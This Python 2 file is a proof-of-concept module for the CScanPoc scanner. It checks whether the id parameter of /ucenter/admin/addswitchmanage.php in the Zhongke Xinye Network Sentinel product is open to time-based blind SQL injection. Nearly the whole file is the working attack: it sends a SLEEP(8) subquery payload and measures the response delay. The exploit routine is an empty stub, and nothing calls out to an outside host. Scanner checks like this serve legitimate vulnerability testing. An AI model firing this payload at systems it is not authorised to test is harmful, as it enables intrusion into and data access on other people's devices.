# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'Seentech_0004' # 平台漏洞编号，留空
    name = '中科新业网络哨兵 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-17'  # 漏洞公布时间
    desc = '''
        中科新业网络哨兵 /ucenter/admin/addswitchmanage.php 参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cf259feb-7116-4787-9d4d-1fbe6cbbbe3e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2010-0126977
            hh = hackhttp.hackhttp()
            url = self.target + "/ucenter/admin/addswitchmanage.php?act=E&id=1"
            payload1 = "+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))ToKi)"
            t1 = time.time()
            code1, _, _, _, _ = hh.http(url)
            true_time = time.time() - t1
            t2 = time.time()
            code2,_,_,_,_ = hh.http(url + payload1)
            false_time = time.time() - t2
            if code1 == 200 and code2 == 200 and false_time-true_time > 7:
                #security_hole(url + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
